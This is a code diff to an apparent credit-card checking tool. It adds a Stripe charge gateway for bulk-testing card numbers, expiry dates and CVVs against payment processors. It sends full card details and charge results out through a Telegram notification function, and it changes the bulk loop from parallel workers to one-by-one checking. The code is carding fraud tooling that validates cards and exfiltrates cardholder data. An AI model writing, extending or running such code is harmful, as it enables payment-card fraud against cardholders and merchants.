@@ -2040,6 +2040,8 @@ const Gateways = () => {
           gatewayResponse = await checkCardViaB3(cardData.card, cardData.month, cardData.year, cardData.cvv);
         } else if (selectedGateway.id === "paygate_charge") {
           gatewayResponse = await checkCardViaPaygate(cardData.card, cardData.month, cardData.year, cardData.cvv);
+        } else if (selectedGateway.id === "stripe_charge") {
+          gatewayResponse = await checkCardViaStripeCharge(cardData.card, cardData.month, cardData.year, cardData.cvv);
         } else if (selectedGateway.id === "payu_charge") {
           gatewayResponse = await checkCardViaPayU(cardData.card, cardData.month, cardData.year, cardData.cvv, payuAmount);
         }
@@ -2213,6 +2215,27 @@ const Gateways = () => {
           }
         }
 
+        // Send Telegram notification for STRIPE CHARGE checks (CHARGED/DECLINED only, skip UNKNOWN) in bulk
+        if (selectedGateway.id === "stripe_charge" && gatewayResponse && checkStatus !== "unknown") {
+          try {
+            const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}${gatewayResponse.apiTotal ? ` (${gatewayResponse.apiTotal})` : ''}`;
+            
+            await supabase.functions.invoke('notify-charged-card', {
+              body: {
+                user_id: userId,
+                card_details: fullCardStr,
+                status: checkStatus === "live" ? "CHARGED" : "DECLINED",
+                response_message: realResponseMessage,
+                amount: gatewayResponse.apiTotal || "$8.00",
+                gateway: "Yunchi Stripe Charge",
+                api_response: gatewayResponse.rawResponse
+              }
+            });
+          } catch (notifyError) {
+            console.log("Failed to send Telegram notification:", notifyError);
+          }
+        }
+
         // Play sound and celebrate for each live card in bulk check
         if (checkStatus === "live") {
           playLiveSoundIfEnabled();
@@ -2280,53 +2303,42 @@ const Gateways = () => {
       }
     };
 
-    // Process cards with limited concurrency (4 workers) for faster checking
-    const concurrentWorkers = 4;
-    let currentIndex = 0;
-
-    const runWorker = async () => {
-      while (currentIndex < cards.length && !bulkAbortRef.current) {
-        const myIndex = currentIndex++;
+    // Process cards ONE BY ONE - send to API and wait for response before next card
+    for (let i = 0; i < validCards.length && !bulkAbortRef.current; i++) {
+      const result = await processCard(i);
+      
+      if (result) {
+        allResults.push(result);
+        processedCount++;
         
-        const result = await processCard(myIndex);
+        setBulkResults(prev => [...prev, result]);
+        setBulkCurrentIndex(processedCount);
+        setBulkProgress((processedCount / validCards.length) * 100);
         
-        if (result) {
-          allResults.push(result);
-          processedCount++;
-          
-          setBulkResults(prev => [...prev, result]);
-          setBulkCurrentIndex(processedCount);
-          setBulkProgress((processedCount / cards.length) * 100);
-          
-          // Calculate estimated time remaining
-          const elapsed = Date.now() - startTime;
-          const avgTimePerCard = elapsed / processedCount;
-          const remainingCards = cards.length - processedCount;
-          const remainingMs = avgTimePerCard * remainingCards / concurrentWorkers;
-          
-          if (remainingCards > 0) {
-            const remainingSecs = Math.ceil(remainingMs / 1000);
-            if (remainingSecs >= 60) {
-              const mins = Math.floor(remainingSecs / 60);
-              const secs = remainingSecs % 60;
-              setBulkEstimatedTime(`~${mins}m ${secs}s remaining`);
-            } else {
-              setBulkEstimatedTime(`~${remainingSecs}s remaining`);
-            }
+        // Calculate estimated time remaining
+        const elapsed = Date.now() - startTime;
+        const avgTimePerCard = elapsed / processedCount;
+        const remainingCards = validCards.length - processedCount;
+        const remainingMs = avgTimePerCard * remainingCards;
+        
+        if (remainingCards > 0) {
+          const remainingSecs = Math.ceil(remainingMs / 1000);
+          if (remainingSecs >= 60) {
+            const mins = Math.floor(remainingSecs / 60);
+            const secs = remainingSecs % 60;
+            setBulkEstimatedTime(`~${mins}m ${secs}s remaining`);
           } else {
-            setBulkEstimatedTime("Finishing...");
+            setBulkEstimatedTime(`~${remainingSecs}s remaining`);
           }
-          
-          // Update remaining lines in textarea
-          const remainingLinesNow = originalLines.slice(processedCount);
-          setBulkInput(remainingLinesNow.join('\n'));
+        } else {
+          setBulkEstimatedTime("Finishing...");
         }
+        
+        // Update remaining lines in textarea
+        const remainingLinesNow = originalLines.slice(processedCount);
+        setBulkInput(remainingLinesNow.join('\n'));
       }
-    };
-
-    // Start 4 workers in parallel for faster processing
-    const workerPromises = Array(concurrentWorkers).fill(null).map(() => runWorker());
-    await Promise.all(workerPromises);
+    }
 
     if (bulkAbortRef.current) {
       toast.info("Bulk check stopped");
